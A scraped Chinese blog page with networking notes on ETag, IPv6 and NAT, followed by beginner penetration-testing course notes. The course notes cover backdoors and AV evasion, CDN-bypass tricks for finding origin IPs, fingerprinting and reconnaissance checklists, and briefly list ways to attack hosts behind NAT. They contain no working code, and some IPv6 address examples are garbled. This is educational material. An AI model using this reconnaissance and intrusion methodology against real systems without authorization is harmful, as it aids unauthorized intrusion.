<ul>
<li>Last -Modified 的缺陷<ul>
<li>只能精确到秒级别，如果资源在 1秒内被修改了，客户端将无法获取最新的资源数据</li>
<li>如果某些资源被修改了（最后一次时间发生变化），但是内容并没有任何</li>
<li>会导致相同数据重复传输，没有使用到缓存</li>
</ul>
</li>
<li>ETag 可以办到<ul>
<li>只要资源的内容没有变化，就不会重复传输数据</li>
<li>只要资源的内容发生了变化，就会返回最新数据给客户端</li>
</ul>
</li>
</ul>
<p><img src="/2021/10/01/network/image-20211020105359301.png" alt="image-20211020105359301"></p>
<h4 id="IPv6"><a href="#IPv6" class="headerlink" title="IPv6"></a>IPv6</h4><ul>
<li><p>IPv6 （Internet Protocol version 6），译为：网际协议第 6版</p>
<ul>
<li>用它来取代 IPv4 主要是为了解决 IPv4 地址枯竭问题，同时它也在其他方面对于 IPv4 有许多改进</li>
<li>然而长期以来 IPv4 在互联网流量中仍占据主要地位， IPv6 的使用增长缓慢</li>
<li>在2019 年12 月，通过 IPv6 使用 Google 服务的用户百分率首次超过 30%<ul>
<li>因为需要设备、操作系统内核升级支持 IPv6</li>
</ul>
</li>
</ul>
</li>
<li><p>IPv6 采用 128 位的地址，而 IPv4 使用的是 32 位</p>
<ul>
<li>支持 2128（约 3.4∗1038）个地址</li>
<li>就以地球人口 70 亿人计算，每平均可分得约 4.86∗1028个IPv6 地址</li>
</ul>
</li>
<li><p>IPv6 地址为 128bit，每 16bit 一组，共 8组</p>
</li>
<li><p>每组以冒号“ :”隔开，每组以 4位十六进制方式表示</p>
<ul>
<li>例如 2001:0db8:86a3:08d3:1319:8a2e:0370:7344</li>
</ul>
</li>
<li><p>类似于 IPv4 的点分十进制，同样也存在六写法</p>
<ul>
<li>2.0.0.1.0.d.b.8.8.5.a.3.0.8.d.3.1.3.1.9.8.a.2.e.0.3.7.0.7.3.4.4</li>
</ul>
</li>
<li><p>每组前面连续的 0可以省略。下面的 IPv6 地址是等价的</p>
<ul>
<li>2001: 0db8 :02de :0000 :00000000:0000 :0000 :0e13</li>
<li>2001: db8 :2de :0:0:0:0:e13</li>
</ul>
</li>
<li><p>可以用双冒号“ ::” 表示一组 0或多组连续的 0，但只能出现一次。下面的 IPv6 地址是等价的</p>
<ul>
<li>2001:db8:2de 2de:0: e13</li>
<li>2001:db8:2de 2de:: e13</li>
</ul>
</li>
<li><p>2001::25de::cade 是非法的，因为双冒号出现了两次会造成歧义</p>
<ul>
<li>2001: 0000:0000:0000:0000 : 00000000:cade</li>
<li>2001: 0000 : 0000:0000:0000:0000 0000:cade</li>
</ul>
</li>
<li><p>::1 是本地环回址（ 0:1 ）</p>
</li>
</ul>
<p><strong>首部格式</strong></p>
<p><img src="/2021/10/01/network/image-20211020111032419.png" alt="image-20211020111032419"></p>
<ul>
<li>有40字节的固定首部</li>
</ul>
<p><img src="/2021/10/01/network/image-20211020111103491.png" alt="image-20211020111103491"></p>
<ul>
<li><p>Version（占 4bit ，0110 ）：版本号</p>
</li>
<li><p>Traffic Class（占 8bit ）：交通类别</p>
<ul>
<li>指示数据包的类别或优先级，可以帮助路由器根处理流量</li>
<li>如果路由器发生拥塞，则优先级最低的数据包将被丢弃</li>
</ul>
</li>
<li><p>Payload Length（占 16bit ）：有效负载长度</p>
<ul>
<li>最大值 65535 字节</li>
<li>包括了扩展头部、上层（传输）数据的长度</li>
</ul>
</li>
<li><p>Hop Limit（占 8bit ）：跳数限制</p>
<ul>
<li>与IPv4 数据包中的 TTL 相同</li>
</ul>
</li>
<li><p>Source Address（占 128bit）：源 IPv6 地址</p>
</li>
<li><p>Destination Address（占 128bit ）：目的 IPv6 地址</p>
</li>
<li><p>Flow Label（占 20bit ）：流标签</p>
<ul>
<li>指示数据包属于哪个特定序列（流）</li>
<li>用数据包的源地址、目的地址、流标签识一个流</li>
</ul>
</li>
</ul>
<p><img src="/2021/10/01/network/image-20211020111243067.png" alt="image-20211020111243067"></p>
<ul>
<li>Next Header（占 8bit ）：下一个头部<ul>
<li>指示扩展头部（如 果存在）的类型、上层数据包协议例TCP 、UDP 、ICMPv6 ）</li>
</ul>
</li>
</ul>
<p><img src="/2021/10/01/network/image-20211020111312594.png" alt="image-20211020111312594"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://monkeyh0ck.github.io/2021/10/01/network/" data-id="clfpez93u0003fcv5fzp5dkvw" data-title="计算机网络" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-NAT" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/NAT/" class="article-date">
  <time class="dt-published" datetime="2021-09-30T16:00:00.000Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/NAT/">NAT</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h1><blockquote>
<p>由于IPv4数量不够，所以开始推行IPv6，因为IPv4紧张，不可能每个人都有公网IP，为了节约公网IP，使用NAT技术，多台电脑使用同一个公网IP，且可以使用多层NAT技术，达到节约IP地址的目的。</p>
</blockquote>
<p><img src="/2021/10/01/NAT/image-20211022093025872.png" alt="image-20211022093025872"></p>
<p>基本NAT类型</p>
<ul>
<li>静态NAT（公网IP与私网IP一对一）</li>
<li>动态NAT（公网IP与私网IP一对多）</li>
</ul>
<h3 id="动态NAT"><a href="#动态NAT" class="headerlink" title="动态NAT"></a>动态NAT</h3><ol>
<li>客户端请求服务器，报文发送至网关地址的路由器</li>
<li>路由器接收到报文后，检查NAT地址池，找到第一个可用公网IP，将数据包的源地址换成可用的公网地址，路由器同时在NAT表中添加一个表项，记录私有地址到公有地址的映射。路由器将转换完的报文发出</li>
<li>服务器接收到报文，返回响应报文，该报文的目的地址是路由器转换后的公网IP</li>
<li>路由器接收到响应报文，发现报文的目的IP在NAT地址池中，则查看NAT表，找到对应表项后，将公网地址换为私网地址，再转发给客户端</li>
<li>客户端接收到报文，完成一直请求与响应</li>
</ol>
<p>NAT中私有地址和公网地址是一对一的，只解决了公网与私网通信问题，但是并不节约公网地址</p>
<h3 id="NAPT"><a href="#NAPT" class="headerlink" title="NAPT"></a>NAPT</h3><p>NAPT对数据包的 IP 地址、协议类型、传输层端口号同时进行转换，节约公网IP地址</p>
<ol>
<li>客户端请求服务器，报文发送至网关地址的路由器</li>
<li>路由器接收到报文后，检查NAT地址池，找到第一个可用公网IP，将数据包的源地址换成可用的公网地址，同时检查该公网地址第一个可用的端口，将源端口替换成该端口，路由器同时在NAT表中添加一个表项，记录私有地址到公有地址的映射。路由器将转换完的报文发出</li>
<li>服务器接收到报文，返回响应报文，该报文的目的地址是路由器转换后的公网IP</li>
<li>路由器接收到响应报文，发现报文的目的IP在NAT地址池中，则查看NAT表，找到对应表项后，将公网地址与端口换为私网地址与端口，再转发给客户端</li>
<li>客户端接收到报文，完成一直请求与响应</li>
</ol>
<h3 id="Easy-IP"><a href="#Easy-IP" class="headerlink" title="Easy IP"></a>Easy IP</h3><p>由于公网IP地址是动态分配的，无法事先确定，无法配置NAPT地址池，为解决该问题，使用Easy IP</p>
<p><strong>Easy IP</strong> 又称为基于接口的地址转换。在地址转换时，Easy IP 的工作原理与 NAPT 相同，对数据包的 IP 地址、协议类型、传输层端口号同时进行转换。但 Easy IP 直接使用公网接口的 IP 地址作为转换后的源地址。Easy IP 适用于<strong>拨号接入</strong>互联网，动态获取公网 IP 地址的场合。</p>
<p>Easy IP 无需配置地址池，只需要配置一个 <strong>ACL</strong>（访问控制列表），用来指定需要进行 NAT 转换的私有 IP 地址范围。</p>
<h3 id="NAT-Server"><a href="#NAT-Server" class="headerlink" title="NAT Server"></a>NAT Server</h3><p>由NAT和NAPT工作原理可知，私网地址请求公网地址，中间经过NAT转换后，可以访问到公网地址，公网主机，接收到的源地址是路由器的公网地址。</p>
<p>当公网地址想要请求私网地址时，它只能请求到路由器的公网地址，无法请求到私网的主机。当有内网对外网提供服务的时候，为了让公网地址访问到内网服务器，使用NAT Server功能，将私网的地址与端口映射到公网上。</p>
<h3 id="NAT-ALG"><a href="#NAT-ALG" class="headerlink" title="NAT ALG"></a>NAT ALG</h3><p>基本 NAT 和 NAPT 只能识别并修改 IP 报文中的 IP 地址和端口号信息，无法修改报文内携带的信息，因此对于一些 IP 报文内携带网络信息的协议，例如 FTP 、DNS 、SIP 、H.323 等，是无法正确转换的。</p>
<p><strong>ALG</strong> 能够识别应用层协议内的网络信息，在转换 IP 地址和端口号时，也会对应用层数据中的网络信息进行正确的转换。</p>
<p>例如：ALG 处理 FTP 的 Active 模式</p>
<p>FTP有两个通信通道，一个Control通道和Data通道</p>
<ol>
<li>客户端发起FTP请求，携带数据记录自己的IP地址和Data通道的端口</li>
<li>路由器收到请求后，首先将control通道的私网IP地址和端口进行映射转换，随后识别到该报文为FTP报文，根据原始数据，为Data通道建立第二个映射，并将报文的IP地址和端口改为data通道映射后的地址和端口，发出</li>
<li>服务器接收到FTP报文后返回响应，请求Data通信的地址为经过路由器转换后的公网地址和端口</li>
<li>路由器接收到响应报文后，会根据NAT表进行转换，实现FTP通信</li>
</ol>
<h3 id="NAT类型"><a href="#NAT类型" class="headerlink" title="NAT类型"></a>NAT类型</h3><ul>
<li>完全圆锥形NAT<ul>
<li>同一个内部地址(iAddr:iPort)只会映射相同的外部地址(eAddr:ePort)，映射完成后，目标IP端口都无限制。</li>
<li><img src="/2021/10/01/NAT/image-20211022144144726.png" alt="image-20211022144144726"></li>
</ul>
</li>
<li>受限圆锥形NAT<ul>
<li>同一个内部地址(iAddr:iPort)只会映射相同的外部地址(eAddr:ePort)，映射完成后，必须先发一个包给目标，然后才能收到目标回发的包，目标端口无限制。</li>
<li><img src="/2021/10/01/NAT/image-20211022144305761.png" alt="image-20211022144305761"></li>
</ul>
</li>
<li>端口受限圆锥形NAT<ul>
<li>同一个内部地址(iAddr:iPort)只会映射相同的外部地址(eAddr:ePort)，映射完成后，必须先发一个包给目标(tAddr:tPort)，然后才能收到目标(tAddr:tPort)回发的包，有目标端口限制。</li>
<li><img src="/2021/10/01/NAT/image-20211022144350871.png" alt="image-20211022144350871"></li>
</ul>
</li>
<li>对称NAT<ul>
<li>同一个内部地址(iAddr:iPort)对不同目标(tAddr1:tPort1)(tAddr2:tPort2)会映射出不同的外部地址(eAddr1:ePort1)(eAddr2:ePort2)，必须先发一个包给目标(iAddr:iPort)-&gt;(eAddr1:ePort1)-&gt;(tAddr1:tPort1)，才能收到回发的包(tAddr1:tPort1)-&gt;(eAddr1:ePort1)-&gt;(iAddr:iPort1)。</li>
<li><img src="/2021/10/01/NAT/image-20211022144418110.png" alt="image-20211022144418110"></li>
</ul>
</li>
</ul>
<h3 id="NAT攻击方法"><a href="#NAT攻击方法" class="headerlink" title="NAT攻击方法"></a>NAT攻击方法</h3><p>由于NAT的映射，外网无法直接访问内网，而内网可以访问外网，绕过NAT攻击内网的方法有以下几种</p>
<ul>
<li>直接入侵路由器，获取NAT表，将内网的主机映射出来，由此攻击内网主机</li>
<li>在外网架设服务器，让内网主机主动访问，再通过服务器传输木马，病毒来实现控制内网主机</li>
</ul>
<blockquote>
<p>参考文献：</p>
<p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/31332694">NAT转换是怎么工作的？ - 知乎 (zhihu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/86759357">NAT穿透 - 知乎 (zhihu.com)</a></p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://monkeyh0ck.github.io/2021/10/01/NAT/" data-id="clfpez93z000bfcv5fgcbecaq" data-title="NAT" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-xiaodi1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/xiaodi1/" class="article-date">
  <time class="dt-published" datetime="2021-09-30T16:00:00.000Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/xiaodi1/">小迪安全</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="小迪安全"><a href="#小迪安全" class="headerlink" title="小迪安全"></a>小迪安全</h1><h2 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h2><h3 id="基础名词"><a href="#基础名词" class="headerlink" title="基础名词"></a>基础名词</h3><h4 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">域名：</span><br><span class="line">二级域名：</span><br><span class="line">域名对于安全测试的意义：</span><br><span class="line">	多级域名的情况下如果测试的域名没有发现漏洞，可以通过测试同域名下的其他网站，来曲线救国，通过其他网站攻击进入服务器获取权限，再来攻击该网站。</span><br></pre></td></tr></table></figure>

<h4 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">什么是DNS：</span><br><span class="line">	DNS将数名解析成IP地址</span><br><span class="line">HOST与DNS的关系:</span><br><span class="line">	本地HOST重定向域名地址</span><br><span class="line">	在解析IP地址前首先检测HOST，当HOST没有时，才访问DNS</span><br><span class="line">CDN：</span><br><span class="line">	缓存节点，根据地区接近给一个节点，主要降低通讯时间，相应时间。</span><br><span class="line">常见的dns攻击：</span><br><span class="line">	恶意解析（域名劫持），dns服务器被黑后，请求被指向恶意地址</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">脚本语言：</span><br><span class="line">	python、asp、php、jsp</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">什么是后门：</span><br><span class="line">	方便攻击者下次攻击控制网站（网站后门，服务器后门）</span><br><span class="line">后门实际意义：</span><br><span class="line">	1.方便下次攻击</span><br><span class="line">	2.获取相关权限的管道</span><br><span class="line">后门注意：</span><br><span class="line">	玩法： 更好控制，更隐蔽，等</span><br><span class="line">	免杀：不被检测到，不被识别</span><br></pre></td></tr></table></figure>

<h4 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">WEB架构类型：</span><br><span class="line">	网站源码分脚本类型、分应用方向</span><br><span class="line">	操作系统</span><br><span class="line">	中间件：apache、lis、tomcat、negix等</span><br><span class="line">	数据库：mysql、mmsql等</span><br><span class="line">为什么以web为主：</span><br><span class="line">	实用性广-大多数都有web</span><br></pre></td></tr></table></figure>

<h4 id="WEB漏洞"><a href="#WEB漏洞" class="headerlink" title="WEB漏洞"></a>WEB漏洞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">WEB源码类漏洞：</span><br><span class="line">	SQL注入、上传、xss、代码执行、变量覆盖、逻辑漏洞、反序列化</span><br><span class="line">WEB中间件漏洞：</span><br><span class="line">	</span><br><span class="line">WEB数据库漏洞：</span><br><span class="line">WEB系统层漏洞：</span><br><span class="line">其他第三方漏洞：</span><br><span class="line">APP和PC应用结合类：</span><br></pre></td></tr></table></figure>

<h2 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h2><p><strong>Request</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Request 请求数据包数据格式</span><br><span class="line">1.请求行		请求方法、请求URL、HTTP版本</span><br><span class="line">2.请求头		HOST、Accept、user-agent、Host、Accept-Langeuage、connection、cookie、</span><br><span class="line">3.空行</span><br><span class="line">4.请求体</span><br></pre></td></tr></table></figure>

<p><strong>Response</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#Response 返回数据包格式</span><br><span class="line">1.状态行</span><br><span class="line">2.响应头标</span><br><span class="line">3.空行</span><br><span class="line">4.响应数据</span><br><span class="line"></span><br><span class="line">HTTP响应码</span><br><span class="line">1xx 信息收到</span><br><span class="line">2xx 成功</span><br><span class="line">3xx 重定向</span><br><span class="line">4xx 客户端错误</span><br><span class="line">5xx 服务器错误</span><br><span class="line"></span><br><span class="line">200 存在文件</span><br><span class="line">403 存在文件夹</span><br><span class="line">3xx 均可能存在</span><br><span class="line">404 不存在文件及文件夹</span><br><span class="line">500 均可能存在</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="第三天"><a href="#第三天" class="headerlink" title="第三天"></a>第三天</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># 域名IP文件目录解析安全问题</span><br><span class="line">有的网站用域名访问和用IP访问不在同一路径下</span><br><span class="line">原因是域名解析的设置</span><br><span class="line">IP访问是根目录</span><br><span class="line">域名访问是根目录设置的目录</span><br><span class="line"></span><br><span class="line"># 文件后缀解析对应安全</span><br><span class="line">服务器文件解析，可以通过中间件设置，不同的后缀对应的解析程序</span><br><span class="line">有时文件无法解析，可能就是服务器的中间件在文件后缀解析进行了设置</span><br><span class="line"></span><br><span class="line"># 安全测试中的安全防护</span><br><span class="line">证书验证</span><br><span class="line">在不开启匿名访问的条件下，打开网页需要验证账户密码</span><br><span class="line">访问IP地址黑名单、白名单</span><br><span class="line"></span><br><span class="line"># WEB后门与用户及文件权限</span><br><span class="line">菜刀</span><br><span class="line">匿名访问通过的是Internet来宾用户</span><br><span class="line">设置访问用户在目录下的权限</span><br><span class="line">win用户权限，在有拒绝的情况下，以拒绝为主</span><br><span class="line">设置目录的执行权限</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="第四天"><a href="#第四天" class="headerlink" title="第四天"></a>第四天</h2><p>WEB源码扩展</p>
<p>![截屏2021-08-19 下午6.38.26](xiaodi1&#x2F;截屏2021-08-19 下午6.38.26-9369561.png)</p>
<p>脚本源码安全问题</p>
<p><a target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/">Web安全学习笔记 — Web安全学习笔记 1.0 文档 (websec.readthedocs.io)</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 总结</span><br><span class="line">关注应用分类及脚本类型估摸出可能存在的漏洞，在获得源码后可进行本地安全测试或代码审计，也可分析其目录工作原理</span><br></pre></td></tr></table></figure>

<h2 id="第五天"><a href="#第五天" class="headerlink" title="第五天"></a>第五天</h2><p>数据库</p>
<p>漏洞类型</p>
<p>![截屏2021-08-23 下午8.02.04](xiaodi1&#x2F;截屏2021-08-23 下午8.02.04.png)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"># 操作系统</span><br><span class="line">识别操作系统常见方法</span><br><span class="line">- 如果有网站通过网站识别，如果没有网站通过扫描方法识别</span><br><span class="line">- win网站不区分大小写，linux区分大小写</span><br><span class="line">- 当没有网站时识别方法</span><br><span class="line">	- nmap</span><br><span class="line">	- ttl值 </span><br><span class="line">		- windows TTL：128</span><br><span class="line">		- unix TTL：255</span><br><span class="line">		= lnux TTL：64</span><br><span class="line"></span><br><span class="line">简要两者区别及意义</span><br><span class="line">- 操作系统差异</span><br><span class="line">	- 不同操作系统攻击的方法不一样</span><br><span class="line">	- 区分大小写</span><br><span class="line">	- 一些文件无能在其他系统兼容</span><br><span class="line">- 意义</span><br><span class="line">	- 适用不同的漏洞</span><br><span class="line"></span><br><span class="line">操作系统层面漏洞类型对应意义</span><br><span class="line">- 有些漏洞只有危害，不会涉及权限丢失</span><br><span class="line">- 有些漏洞丢失权限</span><br><span class="line"></span><br><span class="line">简要操作系统层面漏洞影响范围</span><br><span class="line">- 权限</span><br><span class="line">- 崩溃</span><br><span class="line">- 干扰</span><br><span class="line"></span><br><span class="line"># 数据库方面</span><br><span class="line">识别数据库类型常见方法</span><br><span class="line">- 网站</span><br><span class="line">	- php+mysql(3306)</span><br><span class="line">	- ASP+access</span><br><span class="line">	- python+mongdb（27017）</span><br><span class="line">	- jsp+mssql，oracle（1521）</span><br><span class="line">	- aspx+mssql（1433）</span><br><span class="line">- nmap</span><br><span class="line"></span><br><span class="line">数据库类型区别及识别实施</span><br><span class="line">- 数据库不同，漏洞不同</span><br><span class="line">- 攻击方法不同，影响结果不同</span><br><span class="line"></span><br><span class="line">数据库常见漏洞类型及攻击</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">简要数据库层面漏洞影响范围</span><br><span class="line">- 登陆网站后台</span><br><span class="line">- 获取数据库</span><br><span class="line"></span><br><span class="line"># 第三方方面</span><br><span class="line">如何判定有哪些第三方平台或软件</span><br><span class="line">- 访问目录，如：phpadmin</span><br><span class="line">- 端口扫描</span><br><span class="line"></span><br><span class="line">简要为什么要识别第三方平台或软件</span><br><span class="line"></span><br><span class="line">常见第三方平台或软件漏洞类型及攻击</span><br><span class="line">- 可以直接获取权限</span><br><span class="line"></span><br><span class="line">简要第三方平台或软件安全测试的范围</span><br><span class="line"></span><br><span class="line"># 补充</span><br><span class="line">除去常规WEB安全及APP安全测试外，类似服务器单一或复杂的其他服务（邮件、游戏、负载均衡等），也可以作为安全测试目标，此类目标测试原则只是少了WEB应用或其他安全问题，所以民权安全测试思路时很重要的</span><br></pre></td></tr></table></figure>

<h2 id="第六天"><a href="#第六天" class="headerlink" title="第六天"></a>第六天</h2><p>加密编码算法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 常见加密编码等算法解析</span><br><span class="line">MD5，SHA，ASC，进制，时间戳，URL，BASE64，Unescape，AES，DES，等</span><br><span class="line">时间戳：unix时间</span><br><span class="line">URL编码：空格-%20，二次转码-可用于绕</span><br><span class="line">BASE64:区分大小写，字符串末尾经常出现==</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 常见加密形式算法解析</span><br><span class="line">直接加密，带salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合等</span><br><span class="line"></span><br><span class="line"># 常见揭秘方法（针对）</span><br><span class="line">枚举，自定义逆向算法，可逆向</span><br><span class="line"></span><br><span class="line"># 了解常规加密算法的特征</span><br><span class="line">长度位数，自负规律，代码分析，搜索获取</span><br></pre></td></tr></table></figure>

<h2 id="第七天"><a href="#第七天" class="headerlink" title="第七天"></a>第七天</h2><p>CDN绕过</p>
<p>使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 目前常见的CDN绕过技术有</span><br><span class="line">子域名查询      		 （只对主域名进行cdn服务）</span><br><span class="line">邮件服务查询 			（邮箱服务器大部分是内部人员访问）</span><br><span class="line">				   -（访问网页是我找服务器，接收邮件是服务器找我）</span><br><span class="line">国外地址请求			（国内网站一般不会把cdn部署到国外）</span><br><span class="line">遗留文件，扫描全网	  （phpinfo，从各个地方访问网站，从访问的IP分析，找到真是IP地址）</span><br><span class="line">黑暗引擎搜索特定文件	 （黑暗搜索引擎会定时爬取网页数据）</span><br><span class="line">dns历史记录，以量打量  </span><br></pre></td></tr></table></figure>

<h2 id="第八天"><a href="#第八天" class="headerlink" title="第八天"></a>第八天</h2><p>信息收集-WEB</p>
<ul>
<li>WEB<ul>
<li>有CDN<ul>
<li>国外请求</li>
<li>接口查询</li>
<li>黑暗引擎</li>
<li>扫描全网</li>
<li>子域名</li>
</ul>
</li>
<li>无CDN<ul>
<li>程序源码<ul>
<li>内部&#x2F;未知CMS</li>
<li>开源CMS</li>
</ul>
</li>
<li>其他<ul>
<li>操作系统</li>
<li>搭建平台</li>
<li>数据库类型</li>
</ul>
</li>
<li>站点搭建<ul>
<li>目录站点</li>
<li>端口站点</li>
<li>子域名站点</li>
<li>旁注&#x2F;C段站点</li>
<li>类似域名站点</li>
</ul>
</li>
<li>防护应用WAF<ul>
<li>安全狗</li>
<li>宝塔</li>
<li>云盾</li>
<li>安骑士</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>APP<ul>
<li>涉及WEB</li>
<li>非WEB协议<ul>
<li>尝试提取</li>
<li>反编译逆向</li>
<li>若还无WEB转</li>
</ul>
</li>
</ul>
</li>
<li>其他<ul>
<li>资产信息<ul>
<li>以上各种平台信息</li>
<li>whois备案</li>
<li>github监控</li>
</ul>
</li>
<li>第三方应用<ul>
<li>数据库应用<ul>
<li>mysql</li>
<li>mssql</li>
<li>oracle</li>
</ul>
</li>
<li>各种管理平台<ul>
<li>weblogic</li>
<li>phpmyadmin</li>
</ul>
</li>
<li>各种第三方应用<ul>
<li>vsftpd</li>
<li>nexus</li>
<li>git</li>
</ul>
</li>
</ul>
</li>
<li>各种服务接口<ul>
<li>存储服务</li>
<li>支付服务</li>
<li>内部服务</li>
</ul>
</li>
<li>微信公众号<ul>
<li>涉及WEB</li>
<li>涉及APP</li>
<li>涉及其他</li>
</ul>
</li>
<li>内部群内部应用</li>
</ul>
</li>
</ul>
